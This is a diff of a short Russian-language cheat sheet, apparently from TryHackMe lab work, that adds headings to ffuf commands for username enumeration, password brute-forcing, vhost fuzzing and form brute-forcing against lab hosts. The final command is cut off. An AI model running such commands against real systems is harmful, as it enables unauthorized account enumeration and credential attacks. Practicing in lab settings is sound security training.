@@ -1,19 +1,16 @@
-Перечисление
+# Перечисление
 
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt      -X POST      -d "username=FUZZ&email=&password=&cpassword="      -H "Content-Type: application/x-www-form-urlencoded"      -u http://10.82.183.177/customers/signup      -mr "username already exists"      -o valid_usernames.txt
 
-
-Перебор паролей
+# Перебор паролей
 
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.82.183.177/customers/login -fc 200
 
-
-vhosts
+# vhosts
 
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.lookup.thm" -u http://lookup.thm -fs 0 -c -t 50
 
-
-Перебор формы
+# Перебор формы
 
 ffuf -u http://lookup.thm/login.php \
   -X POST \
